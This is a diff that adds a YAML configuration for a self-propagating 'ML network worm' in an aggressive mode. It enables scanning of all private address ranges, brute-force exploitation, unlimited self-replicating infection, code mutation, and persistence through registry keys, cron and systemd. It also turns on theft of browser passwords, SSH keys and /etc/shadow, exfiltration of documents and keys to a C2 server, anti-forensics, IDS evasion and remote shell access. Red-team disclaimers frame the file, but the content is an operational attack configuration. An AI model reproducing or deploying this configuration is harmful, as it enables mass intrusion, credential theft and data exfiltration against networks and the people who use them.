@@ -1,0 +1,176 @@
+# Configuration for ML Network Worm - AGGRESSIVE MODE
+# ⚠️ WARNING: This config enables ALL offensive capabilities
+# ⚠️ ONLY use in authorized red team operations
+# ⚠️ This is a REAL attack configuration - use responsibly
+
+network:
+  target_ranges:
+    - "192.168.0.0/16"      # All 192.168.x.x
+    - "10.0.0.0/8"          # All 10.x.x.x
+    - "172.16.0.0/12"       # All 172.16-31.x.x
+  excluded_ips:
+    - "192.168.1.1"         # Router (optional)
+  scan_timeout: 3
+  max_threads: 200          # Very aggressive scanning
+  ports_to_scan:
+    - 21    # FTP
+    - 22    # SSH
+    - 23    # Telnet
+    - 25    # SMTP
+    - 80    # HTTP
+    - 110   # POP3
+    - 135   # Windows RPC
+    - 139   # NetBIOS
+    - 143   # IMAP
+    - 443   # HTTPS
+    - 445   # SMB
+    - 1433  # MSSQL
+    - 3306  # MySQL
+    - 3389  # RDP
+    - 5432  # PostgreSQL
+    - 5900  # VNC
+    - 6379  # Redis
+    - 8080  # Alt HTTP
+    - 8443  # Alt HTTPS
+    - 27017 # MongoDB
+
+exploit:
+  max_exploit_attempts: 10  # Try harder
+  exploit_timeout: 60       # More time per exploit
+  use_credentials: true
+  credential_wordlist: "wordlists/common_creds.txt"
+  enable_smb: true
+  enable_ssh: true
+  enable_web: true
+  enable_all_exploits: true # Enable ALL 13 exploit modules
+
+propagation:
+  max_infections: 999999    # ⚠️ UNLIMITED - No infection limit
+  propagation_delay: 0.1    # Very fast propagation
+  persistence_enabled: true # ✅ ENABLE persistence
+  self_replicate: true      # ✅ ENABLE self-replication
+  mutation_enabled: true    # ✅ ENABLE code mutation
+  lateral_movement: true    # ✅ ENABLE lateral movement
+
+post_exploitation:
+  # ⚠️ OFFENSIVE CAPABILITIES ENABLED
+  privilege_escalation: true      # ✅ Attempt privilege escalation
+  establish_persistence: true     # ✅ Install persistence mechanisms
+  exfiltrate_data: true          # ✅ ENABLE data exfiltration
+  harvest_credentials: true       # ✅ Harvest credentials
+  screenshot_capture: false       # Optional: capture screenshots
+  keylogging: false              # Optional: keylogging
+  ransomware_mode: false         # ⚠️ DO NOT ENABLE (illegal)
+  
+  # Data exfiltration settings
+  exfiltration:
+    enabled: true                 # ✅ ENABLE exfiltration
+    target_files:
+      - "*.txt"
+      - "*.doc"
+      - "*.docx"
+      - "*.xls"
+      - "*.xlsx"
+      - "*.pdf"
+      - "*.key"
+      - "*.pem"
+      - "*.ppk"
+      - "*.rdp"
+      - "*.config"
+      - "*.conf"
+      - "*.ini"
+      - "*.env"
+      - "*.sql"
+      - "*.db"
+      - "*.sqlite"
+    max_file_size_mb: 50
+    exfil_to_c2: true
+    compress_data: true
+    encrypt_exfil: true
+  
+  # Credential harvesting
+  credentials:
+    browser_passwords: true       # ✅ Extract browser passwords
+    ssh_keys: true               # ✅ Extract SSH keys
+    wifi_passwords: true         # ✅ Extract WiFi passwords
+    windows_credentials: true    # ✅ Extract Windows credentials
+    linux_shadow: true           # ✅ Extract /etc/shadow
+
+evasion:
+  stealth_mode: true            # Enable stealth
+  randomize_timing: true        # Randomize timing
+  detect_honeypots: true        # Detect honeypots
+  detect_ids: true              # Detect IDS/IPS
+  encrypt_traffic: true         # Encrypt C2 traffic
+  max_scan_rate: 500            # Moderate to avoid detection
+  polymorphic_code: true        # Change code signature
+  anti_forensics: true          # Anti-forensics techniques
+  memory_only: false            # Optional: memory-only execution
+
+c2:
+  c2_server: "127.0.0.1"        # Change to your C2 server
+  c2_port: 8443
+  beacon_interval: 60           # Beacon every 60 seconds
+  use_encryption: true          # Encrypt C2 communications
+  fallback_c2:                  # Backup C2 servers
+    - "192.168.1.100:8443"
+  domain_generation: false      # Optional: DGA for C2
+
+ml:
+  host_classifier_path: "ml_models/saved/host_classifier.pkl"
+  rl_agent_path: "ml_models/saved/rl_agent_1000ep.h5"
+  evasion_model_path: "ml_models/saved/evasion_model.h5"
+  use_pretrained: true
+  online_learning: true         # Continue learning
+
+safety:
+  # ⚠️ SAFETY FEATURES DISABLED FOR AGGRESSIVE MODE
+  kill_switch_enabled: true     # Keep kill switch (recommended)
+  kill_switch_code: "EMERGENCY_STOP_AGGRESSIVE_2024"
+  auto_destruct_time: 0         # ⚠️ DISABLED - No auto-destruct
+  geofence_enabled: true        # Keep geofencing (recommended)
+  allowed_networks:
+    - "192.168.0.0/16"
+    - "10.0.0.0/8"
+    - "172.16.0.0/12"
+  max_runtime_hours: 0          # ⚠️ UNLIMITED - No time limit
+  enable_logging: true
+  log_encryption: true          # Encrypt logs
+  
+  # Damage control (optional limits)
+  max_damage_level: 5           # 1-10 scale (5 = moderate)
+  avoid_critical_systems: true  # Don't attack domain controllers, etc.
+  backup_before_modify: false   # Don't backup (faster)
+
+# Aggressive-specific settings
+aggressive:
+  mode: true
+  target_infection_rate: 100    # Try to infect 100% of vulnerable hosts
+  aggressive_propagation: true
+  skip_stealth: false           # Keep some stealth
+  detailed_logging: true
+  exploit_everything: true      # Try all exploits on all hosts
+  
+  # Destructive capabilities (USE WITH EXTREME CAUTION)
+  destructive:
+    enabled: false              # ⚠️ DISABLED by default
+    delete_logs: false          # Delete system logs
+    disable_av: false           # Disable antivirus
+    modify_firewall: false      # Modify firewall rules
+    create_backdoors: false     # Create permanent backdoors
+    
+  # Advanced persistence
+  persistence:
+    registry_keys: true         # Windows registry
+    scheduled_tasks: true       # Windows scheduled tasks
+    cron_jobs: true            # Linux cron jobs
+    systemd_services: true     # Linux systemd
+    startup_folder: true       # Windows startup
+    wmi_persistence: false     # WMI event subscriptions (advanced)
+    
+  # Command execution
+  remote_commands:
+    enabled: true              # Enable remote command execution
+    shell_access: true         # Full shell access
+    file_upload: true          # Upload files to infected hosts
+    file_download: true        # Download files from infected hosts
